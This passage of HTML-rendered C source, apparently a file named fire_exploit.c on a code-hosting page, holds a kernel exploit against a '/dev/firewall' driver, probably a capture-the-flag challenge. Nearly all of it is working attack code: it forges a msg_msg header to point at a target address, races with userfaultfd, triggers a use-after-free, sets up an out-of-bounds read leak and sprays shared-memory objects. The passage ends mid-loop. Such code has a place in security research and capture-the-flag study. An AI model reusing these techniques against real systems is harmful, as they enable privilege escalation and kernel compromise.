          <td id="file-fire_exploit-c-L289" class="blob-num js-line-number js-code-nav-line-number" data-line-number="289"></td>
          <td id="file-fire_exploit-c-LC289" class="blob-code blob-code-inner js-file-line">        evil.<span class="pl-smi">ll_prev</span> = (<span class="pl-k">void</span> *)<span class="pl-c1">0xbaadf00d</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L290" class="blob-num js-line-number js-code-nav-line-number" data-line-number="290"></td>
          <td id="file-fire_exploit-c-LC290" class="blob-code blob-code-inner js-file-line">        evil.<span class="pl-smi">m_type</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L291" class="blob-num js-line-number js-code-nav-line-number" data-line-number="291"></td>
          <td id="file-fire_exploit-c-LC291" class="blob-code blob-code-inner js-file-line">        evil.<span class="pl-smi">m_ts</span> = <span class="pl-c1">0x1008</span> - <span class="pl-c1">0x30</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L292" class="blob-num js-line-number js-code-nav-line-number" data-line-number="292"></td>
          <td id="file-fire_exploit-c-LC292" class="blob-code blob-code-inner js-file-line">        evil.<span class="pl-smi">next</span> = (<span class="pl-k">void</span> *)target_addr;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L293" class="blob-num js-line-number js-code-nav-line-number" data-line-number="293"></td>
          <td id="file-fire_exploit-c-LC293" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-k">sizeof</span>(msg_header));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L294" class="blob-num js-line-number js-code-nav-line-number" data-line-number="294"></td>
          <td id="file-fire_exploit-c-LC294" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">edit</span>(fd, target_idx, buffer, OUTBOUND, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L295" class="blob-num js-line-number js-code-nav-line-number" data-line-number="295"></td>
          <td id="file-fire_exploit-c-LC295" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">//</span>debug();</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L296" class="blob-num js-line-number js-code-nav-line-number" data-line-number="296"></td>
          <td id="file-fire_exploit-c-LC296" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L297" class="blob-num js-line-number js-code-nav-line-number" data-line-number="297"></td>
          <td id="file-fire_exploit-c-LC297" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(<span class="pl-c1">ioctl</span>(uffd, UFFDIO_COPY, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;uf_copy) == -<span class="pl-c1">1</span>) <span class="pl-c"><span class="pl-c">//</span>  wake it up</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L298" class="blob-num js-line-number js-code-nav-line-number" data-line-number="298"></td>
          <td id="file-fire_exploit-c-LC298" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L299" class="blob-num js-line-number js-code-nav-line-number" data-line-number="299"></td>
          <td id="file-fire_exploit-c-LC299" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>uffdio_copy error<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L300" class="blob-num js-line-number js-code-nav-line-number" data-line-number="300"></td>
          <td id="file-fire_exploit-c-LC300" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L301" class="blob-num js-line-number js-code-nav-line-number" data-line-number="301"></td>
          <td id="file-fire_exploit-c-LC301" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L302" class="blob-num js-line-number js-code-nav-line-number" data-line-number="302"></td>
          <td id="file-fire_exploit-c-LC302" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">ioctl</span>(uffd, UFFDIO_UNREGISTER, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;uf_range) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L303" class="blob-num js-line-number js-code-nav-line-number" data-line-number="303"></td>
          <td id="file-fire_exploit-c-LC303" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L304" class="blob-num js-line-number js-code-nav-line-number" data-line-number="304"></td>
          <td id="file-fire_exploit-c-LC304" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error unregistering page for userfaultfd<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L305" class="blob-num js-line-number js-code-nav-line-number" data-line-number="305"></td>
          <td id="file-fire_exploit-c-LC305" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L306" class="blob-num js-line-number js-code-nav-line-number" data-line-number="306"></td>
          <td id="file-fire_exploit-c-LC306" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">munmap</span>((<span class="pl-k">void</span> *)race_page, <span class="pl-c1">0x1000</span>) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L307" class="blob-num js-line-number js-code-nav-line-number" data-line-number="307"></td>
          <td id="file-fire_exploit-c-LC307" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L308" class="blob-num js-line-number js-code-nav-line-number" data-line-number="308"></td>
          <td id="file-fire_exploit-c-LC308" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error on munmapping race page<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L309" class="blob-num js-line-number js-code-nav-line-number" data-line-number="309"></td>
          <td id="file-fire_exploit-c-LC309" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L310" class="blob-num js-line-number js-code-nav-line-number" data-line-number="310"></td>
          <td id="file-fire_exploit-c-LC310" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L311" class="blob-num js-line-number js-code-nav-line-number" data-line-number="311"></td>
          <td id="file-fire_exploit-c-LC311" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L312" class="blob-num js-line-number js-code-nav-line-number" data-line-number="312"></td>
          <td id="file-fire_exploit-c-LC312" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L313" class="blob-num js-line-number js-code-nav-line-number" data-line-number="313"></td>
          <td id="file-fire_exploit-c-LC313" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L314" class="blob-num js-line-number js-code-nav-line-number" data-line-number="314"></td>
          <td id="file-fire_exploit-c-LC314" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L315" class="blob-num js-line-number js-code-nav-line-number" data-line-number="315"></td>
          <td id="file-fire_exploit-c-LC315" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L316" class="blob-num js-line-number js-code-nav-line-number" data-line-number="316"></td>
          <td id="file-fire_exploit-c-LC316" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> <span class="pl-en">register_userfault</span>(<span class="pl-c1">uint64_t</span> race_page, <span class="pl-c1">pthread_t</span> thread, <span class="pl-k">void</span> *(*func)(<span class="pl-k">void</span> *))</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L317" class="blob-num js-line-number js-code-nav-line-number" data-line-number="317"></td>
          <td id="file-fire_exploit-c-LC317" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L318" class="blob-num js-line-number js-code-nav-line-number" data-line-number="318"></td>
          <td id="file-fire_exploit-c-LC318" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> uffd, race;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L319" class="blob-num js-line-number js-code-nav-line-number" data-line-number="319"></td>
          <td id="file-fire_exploit-c-LC319" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffdio_api uf_api;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L320" class="blob-num js-line-number js-code-nav-line-number" data-line-number="320"></td>
          <td id="file-fire_exploit-c-LC320" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">struct</span> uffdio_register uf_register;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L321" class="blob-num js-line-number js-code-nav-line-number" data-line-number="321"></td>
          <td id="file-fire_exploit-c-LC321" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L322" class="blob-num js-line-number js-code-nav-line-number" data-line-number="322"></td>
          <td id="file-fire_exploit-c-LC322" class="blob-code blob-code-inner js-file-line">    uffd = <span class="pl-bu">syscall</span>(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L323" class="blob-num js-line-number js-code-nav-line-number" data-line-number="323"></td>
          <td id="file-fire_exploit-c-LC323" class="blob-code blob-code-inner js-file-line">    uf_api.<span class="pl-smi">api</span> = UFFD_API;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L324" class="blob-num js-line-number js-code-nav-line-number" data-line-number="324"></td>
          <td id="file-fire_exploit-c-LC324" class="blob-code blob-code-inner js-file-line">    uf_api.<span class="pl-smi">features</span> = <span class="pl-c1">0</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L325" class="blob-num js-line-number js-code-nav-line-number" data-line-number="325"></td>
          <td id="file-fire_exploit-c-LC325" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L326" class="blob-num js-line-number js-code-nav-line-number" data-line-number="326"></td>
          <td id="file-fire_exploit-c-LC326" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">ioctl</span>(uffd, UFFDIO_API, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;uf_api) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L327" class="blob-num js-line-number js-code-nav-line-number" data-line-number="327"></td>
          <td id="file-fire_exploit-c-LC327" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L328" class="blob-num js-line-number js-code-nav-line-number" data-line-number="328"></td>
          <td id="file-fire_exploit-c-LC328" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error with the uffdio_api<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L329" class="blob-num js-line-number js-code-nav-line-number" data-line-number="329"></td>
          <td id="file-fire_exploit-c-LC329" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L330" class="blob-num js-line-number js-code-nav-line-number" data-line-number="330"></td>
          <td id="file-fire_exploit-c-LC330" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L331" class="blob-num js-line-number js-code-nav-line-number" data-line-number="331"></td>
          <td id="file-fire_exploit-c-LC331" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L332" class="blob-num js-line-number js-code-nav-line-number" data-line-number="332"></td>
          <td id="file-fire_exploit-c-LC332" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>registering userfaultfd for 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, race_page);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L333" class="blob-num js-line-number js-code-nav-line-number" data-line-number="333"></td>
          <td id="file-fire_exploit-c-LC333" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> page for userfaultfd</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L334" class="blob-num js-line-number js-code-nav-line-number" data-line-number="334"></td>
          <td id="file-fire_exploit-c-LC334" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">mmap</span>((<span class="pl-k">void</span> *)race_page, <span class="pl-c1">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="pl-c1">0</span>, <span class="pl-c1">0</span>) != (<span class="pl-k">void</span> *)race_page)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L335" class="blob-num js-line-number js-code-nav-line-number" data-line-number="335"></td>
          <td id="file-fire_exploit-c-LC335" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L336" class="blob-num js-line-number js-code-nav-line-number" data-line-number="336"></td>
          <td id="file-fire_exploit-c-LC336" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>whoopsie doopsie on mmap<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L337" class="blob-num js-line-number js-code-nav-line-number" data-line-number="337"></td>
          <td id="file-fire_exploit-c-LC337" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L338" class="blob-num js-line-number js-code-nav-line-number" data-line-number="338"></td>
          <td id="file-fire_exploit-c-LC338" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L339" class="blob-num js-line-number js-code-nav-line-number" data-line-number="339"></td>
          <td id="file-fire_exploit-c-LC339" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L340" class="blob-num js-line-number js-code-nav-line-number" data-line-number="340"></td>
          <td id="file-fire_exploit-c-LC340" class="blob-code blob-code-inner js-file-line">    uf_register.<span class="pl-smi">range</span>.<span class="pl-smi">start</span> = race_page;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L341" class="blob-num js-line-number js-code-nav-line-number" data-line-number="341"></td>
          <td id="file-fire_exploit-c-LC341" class="blob-code blob-code-inner js-file-line">    uf_register.<span class="pl-smi">range</span>.<span class="pl-smi">len</span> = <span class="pl-c1">0x1000</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L342" class="blob-num js-line-number js-code-nav-line-number" data-line-number="342"></td>
          <td id="file-fire_exploit-c-LC342" class="blob-code blob-code-inner js-file-line">    uf_register.<span class="pl-smi">mode</span> = UFFDIO_REGISTER_MODE_MISSING;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L343" class="blob-num js-line-number js-code-nav-line-number" data-line-number="343"></td>
          <td id="file-fire_exploit-c-LC343" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L344" class="blob-num js-line-number js-code-nav-line-number" data-line-number="344"></td>
          <td id="file-fire_exploit-c-LC344" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (<span class="pl-c1">ioctl</span>(uffd, UFFDIO_REGISTER, (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)&amp;uf_register) == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L345" class="blob-num js-line-number js-code-nav-line-number" data-line-number="345"></td>
          <td id="file-fire_exploit-c-LC345" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L346" class="blob-num js-line-number js-code-nav-line-number" data-line-number="346"></td>
          <td id="file-fire_exploit-c-LC346" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>error registering page for userfaultfd<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L347" class="blob-num js-line-number js-code-nav-line-number" data-line-number="347"></td>
          <td id="file-fire_exploit-c-LC347" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L348" class="blob-num js-line-number js-code-nav-line-number" data-line-number="348"></td>
          <td id="file-fire_exploit-c-LC348" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L349" class="blob-num js-line-number js-code-nav-line-number" data-line-number="349"></td>
          <td id="file-fire_exploit-c-LC349" class="blob-code blob-code-inner js-file-line">    race = <span class="pl-c1">pthread_create</span>(&amp;thread, <span class="pl-c1">NULL</span>, func, (<span class="pl-k">void</span>*)(<span class="pl-k">long</span>)uffd);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L350" class="blob-num js-line-number js-code-nav-line-number" data-line-number="350"></td>
          <td id="file-fire_exploit-c-LC350" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span>(race != <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L351" class="blob-num js-line-number js-code-nav-line-number" data-line-number="351"></td>
          <td id="file-fire_exploit-c-LC351" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L352" class="blob-num js-line-number js-code-nav-line-number" data-line-number="352"></td>
          <td id="file-fire_exploit-c-LC352" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>can't setup threads for race<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L353" class="blob-num js-line-number js-code-nav-line-number" data-line-number="353"></td>
          <td id="file-fire_exploit-c-LC353" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L354" class="blob-num js-line-number js-code-nav-line-number" data-line-number="354"></td>
          <td id="file-fire_exploit-c-LC354" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L355" class="blob-num js-line-number js-code-nav-line-number" data-line-number="355"></td>
          <td id="file-fire_exploit-c-LC355" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L356" class="blob-num js-line-number js-code-nav-line-number" data-line-number="356"></td>
          <td id="file-fire_exploit-c-LC356" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L357" class="blob-num js-line-number js-code-nav-line-number" data-line-number="357"></td>
          <td id="file-fire_exploit-c-LC357" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L358" class="blob-num js-line-number js-code-nav-line-number" data-line-number="358"></td>
          <td id="file-fire_exploit-c-LC358" class="blob-code blob-code-inner js-file-line"><span class="pl-k">int</span> <span class="pl-en">main</span>(<span class="pl-k">int</span> argc, <span class="pl-k">char</span> **argv, <span class="pl-k">char</span> **envp)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L359" class="blob-num js-line-number js-code-nav-line-number" data-line-number="359"></td>
          <td id="file-fire_exploit-c-LC359" class="blob-code blob-code-inner js-file-line">{</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L360" class="blob-num js-line-number js-code-nav-line-number" data-line-number="360"></td>
          <td id="file-fire_exploit-c-LC360" class="blob-code blob-code-inner js-file-line">    fd = <span class="pl-c1">open</span>(<span class="pl-s"><span class="pl-pds">"</span>/dev/firewall<span class="pl-pds">"</span></span>, O_RDONLY);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L361" class="blob-num js-line-number js-code-nav-line-number" data-line-number="361"></td>
          <td id="file-fire_exploit-c-LC361" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> buffer[<span class="pl-c1">0x2000</span>], recieved[<span class="pl-c1">0x2000</span>];</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L362" class="blob-num js-line-number js-code-nav-line-number" data-line-number="362"></td>
          <td id="file-fire_exploit-c-LC362" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(buffer, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(buffer));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L363" class="blob-num js-line-number js-code-nav-line-number" data-line-number="363"></td>
          <td id="file-fire_exploit-c-LC363" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(recieved, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(recieved));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L364" class="blob-num js-line-number js-code-nav-line-number" data-line-number="364"></td>
          <td id="file-fire_exploit-c-LC364" class="blob-code blob-code-inner js-file-line">    msg *message = (msg *)buffer;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L365" class="blob-num js-line-number js-code-nav-line-number" data-line-number="365"></td>
          <td id="file-fire_exploit-c-LC365" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> qid, size;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L366" class="blob-num js-line-number js-code-nav-line-number" data-line-number="366"></td>
          <td id="file-fire_exploit-c-LC366" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L367" class="blob-num js-line-number js-code-nav-line-number" data-line-number="367"></td>
          <td id="file-fire_exploit-c-LC367" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(buffer, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(buffer));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L368" class="blob-num js-line-number js-code-nav-line-number" data-line-number="368"></td>
          <td id="file-fire_exploit-c-LC368" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(buffer, <span class="pl-c1">0x41</span>, <span class="pl-c1">0x40</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L369" class="blob-num js-line-number js-code-nav-line-number" data-line-number="369"></td>
          <td id="file-fire_exploit-c-LC369" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0x50</span>; i &lt; <span class="pl-c1">0x54</span>; i++)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L370" class="blob-num js-line-number js-code-nav-line-number" data-line-number="370"></td>
          <td id="file-fire_exploit-c-LC370" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L371" class="blob-num js-line-number js-code-nav-line-number" data-line-number="371"></td>
          <td id="file-fire_exploit-c-LC371" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">add</span>(fd, i, buffer, INBOUND);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L372" class="blob-num js-line-number js-code-nav-line-number" data-line-number="372"></td>
          <td id="file-fire_exploit-c-LC372" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L373" class="blob-num js-line-number js-code-nav-line-number" data-line-number="373"></td>
          <td id="file-fire_exploit-c-LC373" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">add</span>(fd, <span class="pl-c1">0</span>, buffer, INBOUND);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L374" class="blob-num js-line-number js-code-nav-line-number" data-line-number="374"></td>
          <td id="file-fire_exploit-c-LC374" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">duplicate</span>(fd, <span class="pl-c1">0</span>, INBOUND);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L375" class="blob-num js-line-number js-code-nav-line-number" data-line-number="375"></td>
          <td id="file-fire_exploit-c-LC375" class="blob-code blob-code-inner js-file-line">    qid = <span class="pl-c1">make_queue</span>(IPC_PRIVATE, <span class="pl-c1">0666</span> | IPC_CREAT);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L376" class="blob-num js-line-number js-code-nav-line-number" data-line-number="376"></td>
          <td id="file-fire_exploit-c-LC376" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L377" class="blob-num js-line-number js-code-nav-line-number" data-line-number="377"></td>
          <td id="file-fire_exploit-c-LC377" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> OOB read leak setup</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L378" class="blob-num js-line-number js-code-nav-line-number" data-line-number="378"></td>
          <td id="file-fire_exploit-c-LC378" class="blob-code blob-code-inner js-file-line">    size = <span class="pl-c1">0x1010</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L379" class="blob-num js-line-number js-code-nav-line-number" data-line-number="379"></td>
          <td id="file-fire_exploit-c-LC379" class="blob-code blob-code-inner js-file-line">    message-&gt;<span class="pl-smi">mtype</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L380" class="blob-num js-line-number js-code-nav-line-number" data-line-number="380"></td>
          <td id="file-fire_exploit-c-LC380" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(message-&gt;<span class="pl-smi">mtext</span>, <span class="pl-c1">0x41</span>, size);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L381" class="blob-num js-line-number js-code-nav-line-number" data-line-number="381"></td>
          <td id="file-fire_exploit-c-LC381" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L382" class="blob-num js-line-number js-code-nav-line-number" data-line-number="382"></td>
          <td id="file-fire_exploit-c-LC382" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> trigger UAF</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L383" class="blob-num js-line-number js-code-nav-line-number" data-line-number="383"></td>
          <td id="file-fire_exploit-c-LC383" class="blob-code blob-code-inner js-file-line">    delete(fd, <span class="pl-c1">0</span>, INBOUND);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L384" class="blob-num js-line-number js-code-nav-line-number" data-line-number="384"></td>
          <td id="file-fire_exploit-c-LC384" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L385" class="blob-num js-line-number js-code-nav-line-number" data-line-number="385"></td>
          <td id="file-fire_exploit-c-LC385" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> allocate over old chunk because LIFO</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L386" class="blob-num js-line-number js-code-nav-line-number" data-line-number="386"></td>
          <td id="file-fire_exploit-c-LC386" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">send_msg</span>(qid, message, size - <span class="pl-c1">0x30</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L387" class="blob-num js-line-number js-code-nav-line-number" data-line-number="387"></td>
          <td id="file-fire_exploit-c-LC387" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L388" class="blob-num js-line-number js-code-nav-line-number" data-line-number="388"></td>
          <td id="file-fire_exploit-c-LC388" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> spray shmem structures</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L389" class="blob-num js-line-number js-code-nav-line-number" data-line-number="389"></td>
          <td id="file-fire_exploit-c-LC389" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> shmid;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L390" class="blob-num js-line-number js-code-nav-line-number" data-line-number="390"></td>
          <td id="file-fire_exploit-c-LC390" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">char</span> *shmaddr;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L391" class="blob-num js-line-number js-code-nav-line-number" data-line-number="391"></td>
          <td id="file-fire_exploit-c-LC391" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; <span class="pl-c1">0x50</span>; i++)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L392" class="blob-num js-line-number js-code-nav-line-number" data-line-number="392"></td>
          <td id="file-fire_exploit-c-LC392" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L393" class="blob-num js-line-number js-code-nav-line-number" data-line-number="393"></td>
